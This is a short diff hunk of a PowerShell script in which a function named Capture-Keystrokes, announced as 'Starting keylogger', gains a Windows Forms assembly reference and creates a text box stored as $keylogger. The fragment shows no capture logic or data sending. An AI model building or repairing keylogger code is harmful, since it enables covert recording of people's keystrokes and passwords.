@@ -17,6 +17,9 @@ function Log-Message {
 function Capture-Keystrokes {
     Log-Message "Starting keylogger."
     try {
+        # Add a reference to the System.Windows.Forms assembly
+        Add-Type -AssemblyName System.Windows.Forms
+
         $keylogger = New-Object -TypeName System.Windows.Forms.TextBox
         $keylogger.Multiline = $true
         $keylogger.Width = 200
